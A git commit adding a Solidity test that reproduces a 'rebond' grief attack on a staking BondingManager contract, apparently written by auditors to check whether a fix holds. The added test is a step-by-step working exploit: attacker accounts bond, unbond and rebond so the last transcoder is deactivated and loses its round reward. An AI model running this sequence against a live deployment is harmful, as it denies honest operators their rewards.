ecf39d1aced518ae0910479d1fb67ed09bcee4ad
SidestreamCrunchyCarrot <crunchycarrot@sidestream.tech>
2025-07-16 10:39:45 +0200

    add test to confirm the rebond attack still being present

--- src/test/BondingManagerGriefLastTranscoderRewardFix.sol
+++ src/test/BondingManagerGriefLastTranscoderRewardFix.sol
@@ -71,4 +71,77 @@ contract BondingManagerGriefLastTranscoderRewardFix is BondingManagerGriefLastTr
 
         /// Note that the attacker can still withdraw all the fund they use for the attack at the withdrawRound
     }
+
+    function testFixRebond() public {
+        // Deploy new `BondingManager`
+        BondingManager newBondingManagerTarget = new BondingManager(address(CONTROLLER));
+
+        // Update `BondingManagerTarget` using the helper
+        stageAndExecuteOne(
+            address(CONTROLLER),
+            0,
+            abi.encodeWithSelector(
+                CONTROLLER.setContractInfo.selector,
+                keccak256(abi.encodePacked("BondingManagerTarget")),
+                address(newBondingManagerTarget),
+                bytes32(0)
+            )
+        );
+
+        // attacker needs two accounts for the attack
+        address hacker = newAddr();
+        address hackerForRebond = newAddr();
+        address lastTranscoder = _getLastTranscoder();
+
+        /// attacker needs 450 + 3 lpt to execute the attack
+        vm.startPrank(minter);
+        lpt.mint(hacker, 450 * 1e18 + 1);
+        lpt.mint(hackerForRebond, 2);
+        vm.stopPrank();
+
+        /// ---------------------- ROUND = 45816 ----------------------
+        _skipToNextRound();
+
+        // attacker bonds to the last transcoder and immediately unbonds
+        vm.startPrank(hackerForRebond);
+        lpt.approve(address(bondingManager), type(uint256).max);
+        bondingManager.bond(2, lastTranscoder);
+        vm.stopPrank();
+
+        /// attacker bond for themself to make their status in the next round become "Bonded"
+        vm.startPrank(hacker);
+        lpt.approve(address(bondingManager), type(uint256).max);
+        bondingManager.bond(1, hacker);
+        vm.stopPrank();
+
+        /// ---------------------- ROUND = 45817 ----------------------
+        _skipToNextRound();
+
+        /// attacker bond more than the last transcoder and kick them out of the `transcoderPool`
+        vm.startPrank(hacker);
+        bondingManager.bond(450 * 1e18, hacker);
+        assertEq(hacker, _getLastTranscoder());
+
+        /// attacker unbond all to make the `transcoderPool` not full
+        bondingManager.unbond(_getDelegatorData(hacker).bondedAmount);
+        vm.stopPrank();
+
+        // attacker unbonds and rebonds the last transcoder,
+        // the `lastTranscoder` is added into the `transcoderPool` again and become deactivated.
+        uint256 unbondingLockId = _getDelegatorData(hackerForRebond).nextUnbondingLockId;
+        vm.startPrank(hackerForRebond);
+        bondingManager.unbond(1);
+        bondingManager.rebond(unbondingLockId);
+        vm.stopPrank();
+
+        assertEq(_getTranscoderData(lastTranscoder).activationRound, roundsManager.currentRound() + 1);
+
+        /// the `lastTranscoder` is unable to claim the reward for ROUND = 3640 because it's considered as inactivate
+        // vm.expectRevert(bytes("caller must be an active transcoder"));
+        vm.prank(lastTranscoder);
+        bondingManager.reward();
+        console.log(_getTranscoderData(lastTranscoder).deactivationRound);
+
+        /// Note that the attacker can still withdraw all the fund they use for the attack at the withdrawRound
+    }
 }
